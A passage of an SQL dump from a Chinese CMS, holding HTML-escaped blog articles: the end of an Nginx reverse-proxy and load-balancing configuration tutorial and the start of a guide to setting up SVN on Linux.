/&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;server&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 192.168.1.7:8082;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;server&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;listen&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;80;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;server_name&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;www.cncms.com.cn;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;location / {&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; proxy_pass&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;http://www.cncms.com.cn;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; proxy_set_header&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Host&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $host;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; proxy_set_header&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; X-Real-IP&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$remote_addr;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; proxy_set_header&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; X-Forwarded-For&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$proxy_add_x_forwarded_for;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;log_format&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;www_cncms_com_cn&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;’$remote_addr - $remote_user [$time_local] $request ’&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;’&quot;$status&quot; $body_bytes_sent &quot;$http_referer&quot; ’&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;’&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;’;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;access_log&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;/data1/logs/www.log&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;www_cncms_com_cn;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;server&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;listen&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;80;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;server_name&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;bbs.cncms.com.cn;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;location / {&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; proxy_pass&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;http://bbs.cncms.com.cn;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; proxy_set_header&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Host&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $host;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; proxy_set_header&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; X-Real-IP&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$remote_addr;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; proxy_set_header&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; X-Forwarded-For&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$proxy_add_x_forwarded_for;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;log_format&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;bbs_cncms_com_cn&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;’$remote_addr - $remote_user [$time_local] $request ’&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;’&quot;$status&quot; $body_bytes_sent &quot;$http_referer&quot; ’&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;’&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;’;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;access_log&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;/data1/logs/blog.log&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;bbs_cncms_com_cn;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n} &lt;/div&gt;\r\n&lt;/div&gt;\r\n附：Nginx&amp;nbsp;的安装方法可参照&lt;a style=&quot;color:#333333;text-decoration:none;&quot; href=&quot;http://cncms.com.cn/integ/462.htm&quot;&gt;《Nginx&amp;nbsp;0.5.31&amp;nbsp;+&amp;nbsp;PHP&amp;nbsp;5.2.4（FastCGI）搭建可承受3万以上并发连接数，胜过apache&amp;nbsp;10倍的Web服务器》&lt;/a&gt;文章的以下段落（仅做负载均衡，无需支持PHP的安装方法）：&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n　　二、安装PHP&amp;nbsp;5.2.4（FastCGI模式）&amp;nbsp;&lt;br /&gt;\r\n　　4、创建www用户和组，以及其使用的目录：&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n　　三、安装Nginx&amp;nbsp;0.5.31&amp;nbsp;&lt;br /&gt;\r\n　　1、安装Nginx所需的pcre库：&amp;nbsp;&lt;br /&gt;\r\n　　2、安装Nginx&amp;nbsp;&lt;br /&gt;\r\n　　3、创建Nginx日志目录&amp;nbsp;&lt;br /&gt;\r\n　　5、启动Nginx&amp;nbsp;&lt;/span&gt;&lt;/div&gt;\r\n&lt;/div&gt;\r\n', 1, 1, 0, 0, 1302186974, 1, 'admin'),
(34, 1, 'linux下的SVN配置', '', '', '&lt;div class=&quot;CopyrightStatement lh22&quot;&gt;原创作品，允许转载，转载时请务必以超链接形式标明文章 &lt;a style=&quot;text-decoration:underline;&quot; href=&quot;http://flandycheng.blog.51cto.com/855176/449725&quot; target=&quot;_blank&quot;&gt;&lt;font color=&quot;#795b38&quot;&gt;原始出处&lt;/font&gt;&lt;/a&gt; 、作者信息和本声明。否则将追究法律责任。&lt;a href=&quot;http://flandycheng.blog.51cto.com/855176/449725&quot;&gt;&lt;font color=&quot;#795b38&quot;&gt;http://flandycheng.blog.51cto.com/855176/449725&lt;/font&gt;&lt;/a&gt; &lt;/div&gt;\r\n&lt;!--正文 begin--&gt;&lt;div class=&quot;showContent&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size:14px;color:#383838;line-height:24px;font-family:arial, helvetica, sans-serif;&quot;&gt;&lt;table style=&quot;padding-right:0px;padding-left:0px;padding-bottom:0px;margin:0px;padding-top:0px;&quot;&gt;&lt;tbody style=&quot;padding-right:0px;padding-left:0px;padding-bottom:0px;margin:0px;padding-top:0px;&quot;&gt;&lt;tr style=&quot;padding-right:0px;padding-left:0px;padding-bottom:0px;margin:0px;padding-top:0px;&quot;&gt;&lt;td style=&quot;padding-right:0px;padding-left:0px;padding-bottom:0px;margin:0px;padding-top:0px;&quot;&gt;&lt;br /&gt;\r\n一、安装SVN默认安装到/usr/bin下面&lt;br /&gt;\r\n&lt;br /&gt;\r\n二、创建仓库 svnadmin create /home/svnrepo&lt;br /&gt;\r\n&lt;br /&gt;\r\n/root/svnrepo为所创建仓库的路径，理论上可以是任何目录&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br 